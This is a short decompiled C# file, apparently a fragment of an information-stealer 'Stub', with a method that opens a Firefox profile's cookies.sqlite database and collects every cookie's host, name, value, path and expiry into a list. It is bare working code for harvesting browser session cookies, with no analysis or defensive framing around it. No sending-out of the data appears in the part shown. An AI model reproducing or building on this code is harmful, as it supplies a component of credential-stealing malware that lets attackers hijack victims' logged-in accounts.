using System;
using System.Collections.Generic;
using System.IO;

namespace Stub
{
	// Token: 0x0200000D RID: 13
	public class Class16
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00002D98 File Offset: 0x00000F98
		public static List<Struct5> smethod_0(string String_0)
		{
			List<Struct5> list = new List<Struct5>();
			string text = Class26.smethod_2(String_0);
			if (text == null)
			{
				return list;
			}
			Class27 @class = Class27.smethod_1(Path.Combine(text, "cookies.sqlite"), "moz_cookies");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				list.Add(new Struct5
				{
					String_0 = @class.method_0(i, 4),
					String_1 = @class.method_0(i, 2),
					String_5 = @class.method_0(i, 3),
					String_2 = @class.method_0(i, 5),
					String_3 = @class.method_0(i, 6)
				});
			}
			return list;
		}
	}
}
